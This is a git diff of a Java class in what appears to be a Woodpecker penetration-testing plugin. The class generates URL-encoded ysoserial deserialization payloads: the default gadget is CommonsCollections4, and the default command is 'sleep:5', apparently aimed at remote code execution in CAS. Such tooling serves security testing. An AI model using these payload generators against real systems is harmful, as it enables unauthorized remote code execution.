@@ -1,13 +1,13 @@
-package me.gv7.woodpecker.plugin.payloads;
+package me.gv7.woodpecker.vuldb.execution.deserial;
 
 import me.gv7.woodpecker.plugin.*;
-import me.gv7.woodpecker.plugin.utils.CasCommonUtils;
 
+import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 
-public class CasPayloadGenerate implements IPayloadGenerator {
+public class EncrpytPayloadGenerate implements IPayloadGenerator {
     public static IResultOutput iResultOutput;
     @Override
     public String getPayloadTabCaption() {
@@ -16,15 +16,15 @@ public class CasPayloadGenerate implements IPayloadGenerator {
 
     @Override
     public IArgsUsageBinder getPayloadCustomArgs() {
-        IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
+        IArgsUsageBinder binder = VulPluginImpl.callbacks.getPluginHelper().createArgsUsageBinder();
         List<IArg> args = new ArrayList<>();
-        final IArg gadge = CasRCE.callbacks.getPluginHelper().createArg();
+        final IArg gadge = VulPluginImpl.callbacks.getPluginHelper().createArg();
         gadge.setName("yso_gadget");
         gadge.setDefaultValue("CommonsCollections4");
         gadge.setRequired(true);
         gadge.setDescription("默认用cc4就能打死");
 
-        final IArg shellType = CasRCE.callbacks.getPluginHelper().createArg();
+        final IArg shellType = VulPluginImpl.callbacks.getPluginHelper().createArg();
         shellType.setName("yso_cmd");
         shellType.setDefaultValue("sleep:5");
         shellType.setRequired(true);
@@ -38,14 +38,14 @@ public class CasPayloadGenerate implements IPayloadGenerator {
     }
 
     @Override
-    public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) {
+    public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) throws Throwable {
         iResultOutput = result;
         String className = (String)customArgs.get("yso_gadget");
         String command = (String)customArgs.get("yso_cmd");
 
         result.successPrintln("Generate execution parameter data success!");
         result.rawPrintln("\n");
-        result.rawPrintln(CasCommonUtils.generate(className, command));
+        result.rawPrintln(URLEncoder.encode(CommonUtil.generate(className, command)));
         result.rawPrintln("\n");
     }
 }
